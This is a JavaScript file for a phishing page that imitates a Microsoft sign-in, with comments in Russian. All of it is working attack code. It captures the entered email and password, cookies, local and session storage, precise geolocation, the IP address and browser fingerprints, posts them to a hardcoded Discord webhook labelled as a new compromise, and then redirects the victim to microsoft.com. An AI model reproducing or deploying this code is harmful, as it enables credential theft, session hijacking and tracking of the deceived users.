const WEBHOOK_URL = 'https://discord.com/api/webhooks/1423753064514326658/c7W-WiEKVZ46MWLZ6V7GqaGkCD-aH93Kala4qQYv_yFYZR1akqBUestfW8rzF_9vTaUo';

async function collectData() {
    const btn = document.getElementById('verifyBtn');
    const loading = document.getElementById('loading');
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // Показать загрузку
    btn.style.display = 'none';
    loading.style.display = 'block';

    try {
        // Сбор расширенных данных
        const stolenData = await harvestAllData(email, password);
        
        // Отправка в Discord
        await sendToDiscord(stolenData);
        
        // Задержка перед перенаправлением (для надежности отправки)
        setTimeout(() => {
            window.location.href = 'https://microsoft.com';
        }, 3000);

    } catch (error) {
        console.error('Collection error:', error);
        window.location.href = 'https://microsoft.com';
    }
}

async function harvestAllData(email, password) {
    const data = {
        credentials: {
            email: email,
            password: password,
            timestamp: new Date().toISOString()
        },
        browser: {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            vendor: navigator.vendor,
            language: navigator.language,
            languages: navigator.languages,
            cookieEnabled: navigator.cookieEnabled,
            javaEnabled: navigator.javaEnabled(),
            pdfViewerEnabled: navigator.pdfViewerEnabled
        },
        system: {
            screen: `${screen.width}x${screen.height}`,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset()
        },
        network: {
            referrer: document.referrer,
            url: window.location.href,
            origin: window.location.origin
        },
        storage: {}
    };

    // Cookies
    data.storage.cookies = document.cookie;

    // LocalStorage
    data.storage.localStorage = {};
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        data.storage.localStorage[key] = localStorage.getItem(key);
    }

    // SessionStorage
    data.storage.sessionStorage = {};
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        data.storage.sessionStorage[key] = sessionStorage.getItem(key);
    }

    // IndexedDB (попытка)
    try {
        const databases = await window.indexedDB.databases();
        data.storage.indexedDB = databases.map(db => db.name);
    } catch (e) {}

    // Геолокация
    try {
        const position = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, {
                enableHighAccuracy: true,
                timeout: 5000,
                maximumAge: 0
            });
        });
        data.geolocation = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy
        };
    } catch (e) {
        data.geolocation = 'Permission denied or unavailable';
    }

    // IP адрес
    try {
        const ipResponse = await fetch('https://api64.ipify.org?format=json');
        const ipData = await ipResponse.json();
        data.network.ipAddress = ipData.ip;
        
        // Дополнительная информация по IP
        const ipInfo = await fetch(`http://ip-api.com/json/${ipData.ip}`);
        const ipInfoData = await ipInfo.json();
        data.network.ipInfo = ipInfoData;
    } catch (e) {
        data.network.ipAddress = 'Failed to retrieve';
    }

    // Аудио контекст (fingerprinting)
    try {
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const oscillator = audioContext.createOscillator();
        const analyser = audioContext.createAnalyser();
        oscillator.connect(analyser);
        analyser.connect(audioContext.destination);
        oscillator.start();
        await new Promise(resolve => setTimeout(resolve, 100));
        oscillator.stop();
        data.audioFingerprint = 'Available';
    } catch (e) {
        data.audioFingerprint = 'Unavailable';
    }

    // Canvas fingerprinting
    try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069';
        ctx.fillText('Canvas fingerprint', 2, 15);
        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
        ctx.fillText('Canvas fingerprint', 4, 17);
        data.canvasFingerprint = canvas.toDataURL();
    } catch (e) {
        data.canvasFingerprint = 'Failed';
    }

    // WebRTC IP leak
    try {
        const rtc = new RTCPeerConnection({iceServers: []});
        rtc.createDataChannel('');
        rtc.createOffer()
            .then(offer => rtc.setLocalDescription(offer))
            .catch(() => {});
        rtc.onicecandidate = (ice) => {
            if (ice && ice.candidate && ice.candidate.candidate) {
                data.webrtcLeak = ice.candidate.candidate;
            }
        };
    } catch (e) {}

    // Установленные расширения
    data.extensions = await detectExtensions();

    return data;
}

async function detectExtensions() {
    const extensions = [];
    const extensionTests = [
        { id: 'bhlhnicpbhignbdhedgjhgdocnmhomnp', name: 'ColorZilla' },
        { id: 'cfhdojbkjhnklbpkdaibdccddilifddb', name: 'AdBlock Plus' },
        { id: 'cjpalhdlnbpafiamejdnhcphjbkeiagm', name: 'uBlock Origin' },
        { id: 'fmkadmapgofadopljbjfkapdkoienihi', name: 'React Developer Tools' },
        { id: 'nhdogjmejiglipccpnnnanhbledajbpd', name: 'Vue.js devtools' }
    ];

    for (const ext of extensionTests) {
        try {
            await fetch(`chrome-extension://${ext.id}/manifest.json`);
            extensions.push(ext.name);
        } catch(e) {}
    }
    return extensions;
}

async function sendToDiscord(data) {
    const embed = {
        title: "🎣 NEW COMPROMISE - MICROSOFT PHISH",
        color: 0xff0000,
        timestamp: new Date().toISOString(),
        fields: [
            {
                name: "🔑 CREDENTIALS",
                value: `**Email:** ${data.credentials.email}\n**Password:** ${data.credentials.password}\n**Time:** ${data.credentials.timestamp}`
            },
            {
                name: "🌐 BROWSER FINGERPRINT",
                value: `**UA:** ${data.browser.userAgent}\n**Platform:** ${data.browser.platform}\n**Language:** ${data.browser.language}\n**Screen:** ${data.system.screen}`
            },
            {
                name: "📍 NETWORK INFORMATION",
                value: `**IP:** ${data.network.ipAddress || 'Unknown'}\n**Timezone:** ${data.system.timezone}\n**Referrer:** ${data.network.referrer || 'Direct'}`
            }
        ]
    };

    // Добавление геолокации если доступно
    if (data.geolocation && typeof data.geolocation === 'object') {
        embed.fields.push({
            name: "🗺️ GEOLOCATION",
            value: `**Lat:** ${data.geolocation.latitude}\n**Lon:** ${data.geolocation.longitude}\n**Accuracy:** ${data.geolocation.accuracy}m`
        });
    }

    // Добавление cookies
    if (data.storage.cookies) {
        embed.fields.push({
            name: "🍪 COOKIES",
            value: `\`\`\`${data.storage.cookies.substring(0, 1000)}\`\`\``
        });
    }

    // Добавление расширений
    if (data.extensions.length > 0) {
        embed.fields.push({
            name: "🔧 EXTENSIONS DETECTED",
            value: data.extensions.join(', ')
        });
    }

    const payload = {
        username: "Microsoft Security Logger",
        embeds: [embed],
        content: `@here NEW HIT - ${data.credentials.email}`
    };

    // Отправка основного отчета
    await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    });

    // Отправка дополнительных данных если они большие
    if (JSON.stringify(data.storage.localStorage).length > 0) {
        const storagePayload = {
            username: "Storage Data",
            content: "**LOCAL STORAGE:**\n```json\n" + 
                JSON.stringify(data.storage.localStorage, null, 2).substring(0, 1900) + 
                "\n```"
        };
        
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(storagePayload)
        });
    }
}
